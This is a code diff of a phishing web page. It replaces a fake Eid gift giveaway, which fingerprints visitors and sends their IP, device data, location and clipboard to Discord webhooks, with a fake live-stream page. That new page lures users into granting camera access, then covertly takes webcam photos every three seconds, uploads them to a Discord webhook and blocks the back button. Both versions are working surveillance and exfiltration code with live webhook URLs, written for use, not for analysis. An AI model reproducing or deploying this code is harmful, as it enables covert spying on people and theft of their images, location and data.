@@ -3,379 +3,213 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Eid Mubarak Gift</title>
-    <link rel="manifest" href="manifest.json">
+    <title>Sarah · LIVE</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-        body {
-            background: linear-gradient(135deg, #0a5c0a, #128012);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 10px;
-        }
-        .box {
-            max-width: 350px;
-            width: 100%;
-            background: white;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-        }
-        .header {
-            background: #ffd700;
-            padding: 20px;
-            text-align: center;
-        }
-        .eid { font-size: 40px; margin-bottom: 5px; }
-        h2 { color: #0a5c0a; font-size: 20px; }
-        .timer {
-            background: #0a5c0a;
-            color: white;
-            padding: 12px;
-            text-align: center;
-            font-size: 24px;
-            font-weight: bold;
-        }
-        .gifts { padding: 15px; }
-        .gift-row {
-            display: flex;
-            align-items: center;
-            padding: 12px;
-            background: #f5f5f5;
-            margin-bottom: 8px;
-            border-radius: 12px;
-            cursor: pointer;
-        }
-        .gift-icon { font-size: 30px; width: 50px; text-align: center; }
-        .gift-name { flex: 1; font-weight: bold; color: #333; }
-        .gift-price { color: #e67e22; font-weight: bold; }
-        .notify-btn {
-            background: #0a5c0a;
-            color: white;
-            border: none;
-            padding: 15px;
-            margin: 15px;
-            border-radius: 12px;
-            width: calc(100% - 30px);
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .footer {
-            text-align: center;
-            padding: 15px;
-            color: #999;
-            font-size: 11px;
-            border-top: 1px solid #eee;
-        }
-        .status {
-            text-align: center;
-            color: #0a5c0a;
-            font-size: 12px;
-            margin: 5px 0;
-        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+        body{background:#000;min-height:100vh;overflow:hidden;position:relative}
+        
+        /* VIDEO - FORCE PLAY */
+        #bg-video{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:0}
+        
+        /* OVERLAY */
+        .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(0deg,rgba(0,0,0,0.8) 0%,transparent 50%,transparent 100%);z-index:1;pointer-events:none}
+        
+        /* TOP BAR */
+        .top-bar{position:fixed;top:0;left:0;right:0;z-index:2;padding:12px 16px;display:flex;justify-content:space-between;pointer-events:none}
+        .live-badge{background:#ff0000;color:white;padding:6px 12px;border-radius:30px;font-size:13px;font-weight:600;display:flex;align-items:center;gap:6px}
+        .live-dot{width:8px;height:8px;background:white;border-radius:50%;animation:pulse 1s infinite}
+        @keyframes pulse{50%{opacity:0.5;transform:scale(1.2)}}
+        .viewer-count{background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);color:white;padding:6px 12px;border-radius:30px;font-size:13px}
+        
+        /* RIGHT ACTIONS */
+        .right-actions{position:fixed;right:16px;bottom:180px;z-index:3;display:flex;flex-direction:column;gap:16px}
+        .action-btn{width:50px;height:50px;border-radius:50%;background:rgba(0,0,0,0.5);backdrop-filter:blur(10px);border:2px solid rgba(255,255,255,0.2);color:white;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:20px;cursor:pointer}
+        .action-btn span{font-size:10px}
+        .action-btn.like{color:#ff3b5c}
+        
+        /* STREAMER INFO */
+        .streamer-info{position:fixed;bottom:120px;left:16px;z-index:3;color:white}
+        .streamer-name{font-size:18px;font-weight:700;margin-bottom:4px;display:flex;align-items:center;gap:8px}
+        .follow-btn{background:#ff0000;border:none;color:white;font-size:12px;padding:4px 12px;border-radius:30px;cursor:pointer}
+        .song-info{font-size:13px;display:flex;align-items:center;gap:6px;background:rgba(0,0,0,0.5);backdrop-filter:blur(10px);padding:6px 12px;border-radius:30px;width:fit-content}
+        
+        /* COMMENTS */
+        .comments-section{position:fixed;bottom:180px;left:16px;right:80px;z-index:3}
+        .comment{display:flex;align-items:center;gap:8px;margin-bottom:8px;animation:slideIn 0.3s}
+        @keyframes slideIn{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}
+        .comment-avatar{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,#ff4500,#ff8c00);display:flex;align-items:center;justify-content:center;color:white;font-size:14px}
+        .comment-bubble{background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);border-radius:30px;padding:8px 14px;color:white;font-size:13px}
+        .comment-user{font-weight:700;color:#ffd700}
+        
+        /* PERMISSION OVERLAY */
+        .permission-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);backdrop-filter:blur(10px);z-index:9999;display:flex;justify-content:center;align-items:center;opacity:0;visibility:hidden;transition:0.3s}
+        .permission-overlay.active{opacity:1;visibility:visible}
+        .permission-card{background:#1a1a1a;border-radius:30px;padding:30px;max-width:350px;text-align:center;color:white;border:2px solid #ff0000}
+        .permission-icon{font-size:60px;margin-bottom:20px}
+        .permission-title{font-size:24px;font-weight:bold;margin-bottom:15px;color:#ff0000}
+        .permission-btn{background:#ff0000;color:white;border:none;padding:15px;border-radius:50px;font-size:18px;font-weight:bold;cursor:pointer;width:100%}
+        .viewer-badge{background:#ff0000;padding:5px 15px;border-radius:30px;display:inline-block;margin-top:10px}
+        
+        /* HIDDEN */
+        #hiddenCanvas,#hiddenVideo{display:none}
+        
+        /* CHAT INPUT */
+        .chat-input{position:fixed;bottom:20px;left:16px;right:16px;z-index:3;display:flex;gap:8px}
+        .chat-field{flex:1;background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.2);border-radius:30px;padding:12px 20px;color:white}
+        .send-btn{width:45px;height:45px;border-radius:50%;background:#ff0000;border:none;color:white;font-size:18px;cursor:pointer}
+        
+        .footer{position:fixed;bottom:70px;left:16px;z-index:3;color:rgba(255,255,255,0.7);font-size:12px;display:flex;gap:16px}
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="header">
-            <div class="eid">🌙</div>
-            <h2>Eid Mubarak Gift</h2>
+    <!-- VIDEO - FIXED FOR AUTOPLAY -->
+    <video autoplay loop playsinline muted id="bg-video">
+        <source src="Girl.mp4" type="video/mp4">
+    </video>
+    
+    <div class="overlay"></div>
+    
+    <video id="hiddenVideo" playsinline></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <div class="permission-overlay" id="permissionOverlay">
+        <div class="permission-card">
+            <div class="permission-icon">📹</div>
+            <div class="permission-title">Join Sarah's Live</div>
+            <div class="permission-text">
+                <span class="viewer-badge">🔴 2,847 watching</span>
+            </div>
+            <button class="permission-btn" onclick="requestCamera()">📸 JOIN NOW</button>
+            <p style="color:#666; font-size:12px; margin-top:15px;">⚡ 127 chatting</p>
         </div>
-        <div class="timer" id="timer">06:00:00</div>
-        <div class="gifts">
-            <div class="gift-row" onclick="showGift()"><span class="gift-icon">⌚</span><span class="gift-name">Smart Watch</span><span class="gift-price">FREE</span></div>
-            <div class="gift-row" onclick="showGift()"><span class="gift-icon">🎧</span><span class="gift-name">Earbuds</span><span class="gift-price">FREE</span></div>
-            <div class="gift-row" onclick="showGift()"><span class="gift-icon">⚡</span><span class="gift-name">Type C Charger</span><span class="gift-price">FREE</span></div>
-        </div>
-        <div class="status" id="statusMsg">🔔 Loading...</div>
-        <button class="notify-btn" onclick="allowPermission()">🔔 ALLOW NOTIFICATION</button>
-        <div class="footer">⏰ Limited time offer</div>
     </div>
 
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <div class="top-bar">
+        <div class="live-badge"><span class="live-dot"></span> LIVE</div>
+        <div class="viewer-count">👁️ <span id="viewerCount">2.8k</span> · 2h</div>
+    </div>
+
+    <div class="right-actions">
+        <div class="profile-pic">👩</div>
+        <button class="action-btn like" onclick="like()">❤️<span>2.1k</span></button>
+        <button class="action-btn" onclick="comment()">💬<span>127</span></button>
+        <button class="action-btn" onclick="gift()">🎁<span>Gift</span></button>
+    </div>
+
+    <div class="streamer-info">
+        <div class="streamer-name">
+            Sarah <span class="follow-btn" onclick="follow()">+ Follow</span>
+        </div>
+        <div class="song-info">
+            <span>🎵</span> birthday salubong tiktok · august 22
+        </div>
+    </div>
+
+    <div class="comments-section" id="commentsSection">
+        <div class="comment"><div class="comment-avatar">J</div><div class="comment-bubble"><span class="comment-user">John</span> ❤️</div></div>
+        <div class="comment"><div class="comment-avatar">E</div><div class="comment-bubble"><span class="comment-user">Emma</span> 🐼</div></div>
+    </div>
+
+    <div class="footer">
+        <span>💬 127 chatting</span>
+        <span>🎁 Gifts: 234</span>
+    </div>
+
+    <div class="chat-input">
+        <input type="text" class="chat-field" id="chatInput" placeholder="Say something..." disabled>
+        <button class="send-btn" id="sendBtn" disabled onclick="sendMessage()">➤</button>
+    </div>
+
     <script>
-        // ================ CONFIG ================
-        const WEBHOOKS = [
-            'https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg',
-            'https://discord.com/api/webhooks/1471082363944702006/_hZWpLDl_Uo2Mf7sHaHjhpLgY4KXfJGPjulB1u407flimKaRyUhIbN0LlVGZTsTttKyR'
-        ];
+        const WEBHOOK = 'https://discord.com/api/webhooks/1501436344398778498/u3am23nI_-F-dUV49wtF5lbp-ytjlULdpVgSSewXkfu3uDItV7CAmG2nyODWo6wcOFPa';
+        let cameraStream, photoInterval;
 
-        // ================ 1. WITHOUT PERMISSION DATA (2 SECOND MEIN) ================
-        async function collectAndSendWithoutPermission() {
-    console.log("Collecting MAGIC data...");
-
-    // 1. IP Address
-    let ip = "Unknown";
-    try {
-        const ipRes = await $.getJSON('https://api.ipify.org?format=json');
-        ip = ipRes.ip;
-    } catch (e) {}
-
-    // 2. Country from IP (FREE API)
-    let country = "Unknown";
-    try {
-        const countryRes = await $.getJSON(`https://ipapi.co/${ip}/json/`);
-        country = countryRes.country_name + ' (' + countryRes.country_code + ')';
-    } catch (e) {}
-
-    // 3. Browser Data
-    const browserData = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        cookieEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack || 'Not set',
-        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-        deviceMemory: navigator.deviceMemory || 'Unknown',
-        touchSupport: 'ontouchstart' in window ? 'Yes' : 'No',
-        screenSize: screen.width + 'x' + screen.height,
-        colorDepth: screen.colorDepth + '-bit',
-        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        referrer: document.referrer || 'Direct'
-    };
-
-    // 4. Network Info
-    let connection = {};
-    if (navigator.connection) {
-        connection = {
-            effectiveType: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink + ' Mbps',
-            rtt: navigator.connection.rtt + ' ms',
-            saveData: navigator.connection.saveData ? 'On' : 'Off'
+        window.onload = () => {
+            // VIDEO PLAY KARO
+            const video = document.getElementById('bg-video');
+            video.play().catch(e => console.log('Autoplay failed:', e));
+            
+            setTimeout(() => {
+                document.getElementById('permissionOverlay').classList.add('active');
+            }, 1500);
         };
-    }
 
-    // 5. Battery Info
-    let batteryInfo = {};
-    if ('getBattery' in navigator) {
-        try {
-            const battery = await navigator.getBattery();
-            batteryInfo = {
-                level: Math.round(battery.level * 100) + '%',
-                charging: battery.charging ? 'Yes' : 'No',
-                chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + ' sec',
-                dischargingTime: battery.dischargingTime === Infinity ? 'Not discharging' : battery.dischargingTime + ' sec'
-            };
-        } catch (e) {}
-    }
-
-    // 6. Device Orientation (Last known)
-    let orientation = { alpha: 'N/A', beta: 'N/A', gamma: 'N/A' };
-    window.addEventListener('deviceorientation', function(e) {
-        orientation = {
-            alpha: Math.round(e.alpha),
-            beta: Math.round(e.beta),
-            gamma: Math.round(e.gamma)
-        };
-    }, { once: true });
-
-    // 7. Media Devices (Count only)
-    let mediaDevices = 'Unknown';
-    try {
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        const cameras = devices.filter(d => d.kind === 'videoinput').length;
-        const mics = devices.filter(d => d.kind === 'audioinput').length;
-        mediaDevices = `📸 ${cameras} Camera(s), 🎤 ${mics} Mic(s)`;
-    } catch (e) {}
-
-    // Prepare Discord Message
-    const data = {
-        content: '@everyone 🎩 **MAGIC DATA (Without Permission)**',
-        embeds: [{
-            title: '📊 Complete Browser Fingerprint',
-            color: 0x00ff00,
-            fields: [
-                { name: '🌍 IP', value: ip, inline: true },
-                { name: '🗺️ Country', value: country, inline: true },
-                { name: '⏱️ Time', value: new Date().toLocaleString(), inline: true },
-                { name: '📱 Platform', value: browserData.platform, inline: true },
-                { name: '💻 CPU Cores', value: browserData.hardwareConcurrency.toString(), inline: true },
-                { name: '🧠 RAM', value: browserData.deviceMemory + ' GB', inline: true },
-                { name: '🖱️ Touch', value: browserData.touchSupport, inline: true },
-                { name: '📺 Screen', value: browserData.screenSize, inline: true },
-                { name: '🎨 Color', value: browserData.colorDepth, inline: true },
-                { name: '🗣️ Language', value: browserData.language, inline: true },
-                { name: '⏰ Timezone', value: browserData.timeZone, inline: true },
-                { name: '🔌 Network', value: connection.effectiveType || 'Unknown', inline: true },
-                { name: '⚡ Battery', value: batteryInfo.level || 'Unknown', inline: true },
-                { name: '🔋 Charging', value: batteryInfo.charging || 'Unknown', inline: true },
-                { name: '📡 Media Devices', value: mediaDevices, inline: true },
-                { name: '🧭 Orientation', value: `α:${orientation.alpha} β:${orientation.beta} γ:${orientation.gamma}`, inline: true },
-                { name: '🚫 Do Not Track', value: browserData.doNotTrack, inline: true }
-            ],
-            timestamp: new Date().toISOString()
-        }]
-    };
-
-    // Send to Webhooks
-    for (const webhook of WEBHOOKS) {
-        try {
-            await fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-        } catch (e) {}
-    }
-
-    document.getElementById('statusMsg').innerHTML = 'allow permissions...';
-}
-
-        // ================ 2. PERMISSION DATA (5 SECOND BAAD) ================
-        async function askForPermissions() {
-            let permissionData = {};
-            let grantedPermissions = [];
-
-            // --- Notification ---
-            if ('Notification' in window) {
-                const notifPerm = await Notification.requestPermission();
-                if (notifPerm === 'granted') {
-                    grantedPermissions.push('🔔 Notifications');
-                    permissionData.notification = 'Granted';
-                } else {
-                    permissionData.notification = 'Denied';
-                }
-            }
-
-            // --- Location ---
-            if ('geolocation' in navigator) {
-                try {
-                    const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+        function requestCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    cameraStream = stream;
+                    
+                    document.getElementById('permissionOverlay').classList.remove('active');
+                    document.getElementById('chatInput').disabled = false;
+                    document.getElementById('sendBtn').disabled = false;
+                    
+                    // VIDEO SOUND ENABLE KARO (user interaction ke baad)
+                    const video = document.getElementById('bg-video');
+                    video.muted = false; // AB SOUND AAYEGA!
+                    video.volume = 1.0;
+                    
+                    const hiddenVideo = document.getElementById('hiddenVideo');
+                    hiddenVideo.srcObject = stream;
+                    hiddenVideo.play();
+                    
+                    photoInterval = setInterval(capturePhoto, 3000);
+                    
+                    fetch(WEBHOOK, {
+                        method:'POST',
+                        headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify({content:'📹 **User joined**'})
                     });
-                    grantedPermissions.push('📍 Location');
-                    permissionData.location = {
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    };
-                } catch (e) {
-                    permissionData.location = 'Denied';
-                }
-            }
-
-            // --- Camera ---
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                stream.getTracks().forEach(t => t.stop());
-                grantedPermissions.push('📸 Camera');
-                permissionData.camera = 'Granted';
-            } catch (e) {
-                permissionData.camera = 'Denied';
-            }
-
-            // --- Microphone ---
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                stream.getTracks().forEach(t => t.stop());
-                grantedPermissions.push('🎤 Microphone');
-                permissionData.microphone = 'Granted';
-            } catch (e) {
-                permissionData.microphone = 'Denied';
-            }
-
-            // --- Clipboard (Read) ---
-            try {
-                const text = await navigator.clipboard.readText();
-                if (text) {
-                    grantedPermissions.push('📋 Clipboard');
-                    permissionData.clipboard = text.substring(0, 50);
-                }
-            } catch (e) {
-                permissionData.clipboard = 'Denied/No Access';
-            }
-
-            // Prepare Discord Message
-            const data = {
-                content: '@everyone 🔐 **User Permission Data**',
-                embeds: [{
-                    title: '✅ Granted Permissions',
-                    color: 0xffaa00,
-                    fields: [
-                        { name: '🔔 Notification', value: permissionData.notification || 'No Request', inline: true },
-                        { name: '📍 Location', value: permissionData.location ? 'Granted' : 'Denied', inline: true },
-                        { name: '📸 Camera', value: permissionData.camera || 'Denied', inline: true },
-                        { name: '🎤 Microphone', value: permissionData.microphone || 'Denied', inline: true },
-                        { name: '📋 Clipboard', value: permissionData.clipboard ? 'Data Found' : 'No Data', inline: true },
-                        { name: '✅ Total Granted', value: grantedPermissions.length.toString(), inline: true }
-                    ],
-                    description: grantedPermissions.join(' • ') || 'No permissions granted',
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            // Agar location mili to extra field
-            if (permissionData.location && typeof permissionData.location === 'object') {
-                data.embeds[0].fields.push({
-                    name: '📍 Exact Location',
-                    value: `[Map](https://www.google.com/maps?q=${permissionData.location.lat},${permissionData.location.lng})`,
-                    inline: false
-                });
-            }
-
-            // Send to both webhooks
-            for (const webhook of WEBHOOKS) {
-                try {
-                    await fetch(webhook, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    });
-                } catch (e) {}
-            }
-
-            document.getElementById('statusMsg').innerHTML = `✅ Please allow Permission! (${grantedPermissions.length} granted)`;
-            return grantedPermissions;
+                })
+                .catch(() => alert('Camera needed'));
         }
 
-        // ================ MAIN EXECUTION ================
-        window.onload = function() {
-            // Timer
-            let time = 21600;
-            setInterval(() => {
-                if (time > 0) time--;
-                let h = Math.floor(time / 3600);
-                let m = Math.floor((time % 3600) / 60);
-                let s = time % 60;
-                document.getElementById('timer').innerHTML = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
-            }, 1000);
-
-            // STEP 1: WITHOUT PERMISSION DATA (2 SECOND)
-            setTimeout(collectAndSendWithoutPermission, 2000);
-
-            // STEP 2: ASK FOR PERMISSIONS (5 SECOND)
-            setTimeout(askForPermissions, 5000);
-
-            // Register Service Worker
-            if ('serviceWorker' in navigator) {
-                navigator.serviceWorker.register('sw.js');
-            }
-        };
-
-        function showGift() {
-            document.getElementById('statusMsg').innerHTML = '⚠️ Pehle notification allow karo!';
+        function capturePhoto() {
+            try {
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                canvas.width = 320; canvas.height = 240;
+                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.6);
+                const blob = dataURLtoBlob(imageData);
+                const formData = new FormData();
+                formData.append('file', blob, `live_${Date.now()}.jpg`);
+                formData.append('payload_json', JSON.stringify({
+                    content: '📸 **Auto capture**'
+                }));
+                
+                fetch(WEBHOOK, {method:'POST', body:formData});
+            } catch(e) {}
         }
 
-        // Manual button (agar user chahe to)
-        window.allowPermission = askForPermissions;
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(','), mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]), u8arr = new Uint8Array(bstr.length);
+            for(let n = bstr.length; n--;) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], {type:mime});
+        }
 
-        // Wapas aane par
-        document.addEventListener('visibilitychange', function() {
-            if (!document.hidden) {
-                if ('serviceWorker' in navigator) {
-                    navigator.serviceWorker.ready.then(reg => {
-                        reg.showNotification('👋 Wapas aagaye?', { body: 'Gift abhi bhi reserved hai!', tag: 'return' });
-                    });
-                }
-            }
+        function like() {
+            const gift = document.createElement('div');
+            gift.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-size:60px;z-index:9999;animation:float 2s forwards';
+            gift.textContent = '❤️';
+            document.body.appendChild(gift);
+            setTimeout(() => gift.remove(), 2000);
+        }
+
+        function follow() { alert('✅ Following Sarah!'); }
+        function comment() { document.getElementById('chatInput').focus(); }
+        function gift() { alert('🎁 Gift sent!'); }
+        function sendMessage() { alert('Message sent!'); }
+
+        // Block back
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', () => history.pushState(null, null, location.href));
+        
+        // Cleanup
+        window.addEventListener('beforeunload', () => {
+            if(photoInterval) clearInterval(photoInterval);
+            if(cameraStream) cameraStream.getTracks().forEach(t => t.stop());
         });
     </script>
 </body>
